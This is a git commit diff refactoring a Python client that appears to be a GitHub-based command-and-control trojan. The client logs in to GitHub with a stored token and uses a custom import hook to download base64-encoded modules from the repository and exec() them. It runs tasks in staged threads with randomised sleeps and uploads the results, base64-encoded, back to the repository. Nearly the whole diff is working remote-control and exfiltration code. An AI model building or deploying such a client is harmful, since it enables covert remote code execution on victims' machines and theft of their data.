a3b3ede3a85dc31630d27b8bfcf8424166cc21cd
JochiRaider <87738004+JochiRaider@users.noreply.github.com>
2021-12-24 01:51:59 -0500

    Update client_example.py

--- client_example.py
+++ client_example.py
@@ -1,52 +1,27 @@
 #!/usr/bin/env python3
 
-import json
-import base64
 import sys
-import time
-import importlib
-import random
-import threading
-import queue
-
+from base64 import b64decode, b64encode
+from importlib import util
+from random import randint
+from json import loads
+from time import time, sleep 
+from threading import Thread
+from queue import Queue
 from datetime import datetime
 from github3 import login
 
-client_id = None
-
-
-task_queue = queue.Queue()
-
-class GitImporter(object):
-    def __init__(self):
-        self.current_module_code = ""
-    
-    def find_module(self, fullname, path=None):
-        print(f"[**] Attempting to retrieve {fullname}")
-        new_library = get_file_contents(f"modules/{fullname}")         
-        if new_library:
-            self.current_module_code = base64.b64decode(new_library)        
-            return self
-
-    def load_module(self, name):
-        repo = connect_to_github()
-        spec = importlib.util.spec_from_loader(name, loader=None, origin=repo.git_url)
-        mod = importlib.util.module_from_spec(spec)
-        exec(self.current_module_code, mod.__dict__)
-        sys.modules[spec.name] = mod
-        return mod
 
 def connect_to_github():
-    with open('git_stuff.txt', 'r') as t:
-        git_info = eval(t.read())
+    with open('git_stuff.txt', 'r') as f:
+        git_info = eval(f.read())
     gh = login(username=git_info['user'], token=git_info['token']) 
     repo = gh.repository(git_info['user'], git_info['repo_name'])
     return repo
 
-
 def get_file_contents(filepath):
     repo = connect_to_github()
-    branch = branch = repo.branch("main")
+    branch = repo.branch("main")
     tree = branch.commit.commit.tree.to_tree().recurse()
     
     for filename in tree.tree:      
@@ -55,58 +30,97 @@ def get_file_contents(filepath):
             blob = repo.blob(filename._json_data["sha"])
             return blob.content
         
-def get_client_config():
-    config_json = get_file_contents(f"config/{client_id}.json")
-    if config_json == None:
-        configuration = [{'module':'rookie'}]
-    else:
-        configuration = json.loads(base64.b64decode(config_json))
-    for tasks in configuration:
-        if tasks["module"] not in sys.modules:
-            exec(f"import {tasks['module']}")
-    return configuration
+class GitImporter(object):
+    def __init__(self):
+        self.current_module_code = ""
+    
+    def find_module(self, fullname, path=None):
+        print(f"[&] Attempting to retrieve {fullname}")
+        new_library = get_file_contents(f"modules/{fullname}")         
+        if new_library:
+            self.current_module_code = b64decode(new_library)        
+            return self
 
-def store_module_result(data, module):
-    repo = connect_to_github()
-    message = f'{module}__{datetime.now().isoformat()}'
-    remote_path = f"data/{client_id}/{message}.data"
-    bindata = bytes('%r' %data, 'utf-8')
-    repo.create_file(remote_path, message, base64.b64encode(bindata))
+    def load_module(self, name):
+        repo = connect_to_github()
+        spec = util.spec_from_loader(name, loader=None, origin=repo.git_url)
+        mod = util.module_from_spec(spec)
+        exec(self.current_module_code, mod.__dict__)
+        sys.modules[spec.name] = mod
+        return mod
+
+class ClientHandler:
+
+    def __init__(self,) -> None:
+        self.client_id = None
+        self.repo = connect_to_github()
+        self.task_queue = Queue()
+        self.config_path = f'config/{self.client_id}.json'
+        self.data_path = f'data/{self.client_id}'
+
+    def get_client_config(self):
+        config_json = get_file_contents(self.config_path)
+        if config_json == None:
+            configuration = [{'module':'stage_1'}]
+        else:
+            configuration = loads(b64decode(config_json))
+        for tasks in configuration:
+            if tasks['module'] not in sys.modules:
+                exec(f"import {tasks['module']}")
+        return configuration
+         
+    def module_queue(self, module):
+        self.task_queue.put(1)
+        result = sys.modules[module].run()
+        self.task_queue.get()
+        return result
+
+    def create_client_config(self, module):
+        self.client_id = f'ent-{int(time())}'
+        self.config_path = f'config/{self.client_id}.json'
+        self.data_path = f'data/{self.client_id}'
+        result = self.module_queue(module)
+        message = f'{self.client_id} init {datetime.now().isoformat()}' 
+        bindata = bytes(r'%s' %result, 'utf-8')
+        self.repo.create_file(self.config_path, message, bindata)
     
-def module_runner(module):
-    task_queue.put(1)
-    result = sys.modules[module].run()
-    task_queue.get()
-    store_module_result(result, module)
+    def module_runner(self, module):
+        result = self.module_queue(module)
+        message = f'{module}__{datetime.now().isoformat()}'
+        data_path_full = f'{self.data_path}/{int(time())}.data'
+        bindata = bytes('%r' %result, 'utf-8')
+        self.repo.create_file(data_path_full, message, b64encode(bindata))
     
-def create_client_config(module):
-    global client_id
-    client_id = f'ent-{int(time.time())}'
-    task_queue.put(1)
-    result = sys.modules[module].run()
-    task_queue.get()
-    repo = connect_to_github()
-    remote_path = f"config/{client_id}.json"
-    message = f'{client_id} init {datetime.now().isoformat()}' 
-    bindata = bytes(r'%s' %result, 'utf-8')
-    repo.create_file(remote_path, message, bindata)
+    def update_client_config(self, module):
+        result = self.module_queue(module)
+        message = f'{self.client_id} update {datetime.now().isoformat()}' 
+        bindata = bytes(r'%s' %result, 'utf-8')
+        self.repo.file_contents(self.config_path).update(message,bindata)
 
 def main():
     sys.meta_path = [GitImporter()]
-
+    client = ClientHandler()
+    module_list = [] 
     while True:
-        if task_queue.empty():
-            config = get_client_config()
+        if client.task_queue.empty():
+            config = client.get_client_config()
             for task in config:
-                if task['module'] == 'rookie':
-                    t = threading.Thread(target=create_client_config , args=(task['module'],))
-                    t.start()
-                    time.sleep(random.randint(5,10))
+                if task['module'] in module_list and task['module'] != 'sleep':
+                    continue
                 else:
-                    t = threading.Thread(target=module_runner, args=(task['module'],))
-                    t.start()
-                    time.sleep(random.randint(5,10))
-        # time.sleep(random.randint(10000, 60000))
+                    module_list.append(task['module'])
+                    if task['module'] == 'stage_1':
+                        t = Thread(target=client.create_client_config, args=(task['module'],))
+                        t.start()
+                        sleep(randint(3,6))
+                    elif task['module'] == 'stage_2':
+                        t = Thread(target=client.update_client_config, args=(task['module'],))
+                        t.start()
+                        sleep(randint(5,10))
+                    else:
+                        t = Thread(target=client.module_runner, args=(task['module'],))
+                        t.start()
+                        sleep(randint(5,10))
 
 if __name__=='__main__':
     main()
